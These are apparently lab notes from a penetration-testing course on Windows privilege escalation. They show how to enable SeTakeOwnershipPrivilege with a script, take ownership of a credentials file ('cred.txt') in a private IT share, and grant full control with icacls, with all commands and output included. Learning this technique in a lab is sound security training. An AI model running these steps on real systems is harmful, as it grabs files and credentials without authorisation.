# SeTakeOwnershipPrivilege

## Current User Privileges

```pwsh
PS C:\Users\htb-student> whoami /priv
```

```output title="Output" hl_lines="6"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

## [EnableAllTokenPrivs](https://github.com/fashionproof/EnableAllTokenPrivs)

```pwsh
PS C:\Users\htb-student> C:\Tools\EnableAllTokenPrivs.ps1
PS C:\Users\htb-student> whoami /priv
```

```output title="Output" hl_lines="6"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

## Taking File Ownership

```pwsh
PS C:\Users\htb-student> takeown /f "C:\Department Shares\Private\IT\cred.txt"
```

```output title="Output"
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

## Confirming

```pwsh
PS C:\Users\htb-student> (Get-Acl "C:\Department Shares\Private\IT\cred.txt").Owner
```

```output title="Output"
WINLPE-SRV01\htb-student
```

## ACL Modification

```pwsh
PS C:\Users\htb-student> icacls "C:\Department Shares\Private\IT\cred.txt" /grant htb-student:F
```

```output title="Output"
processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```
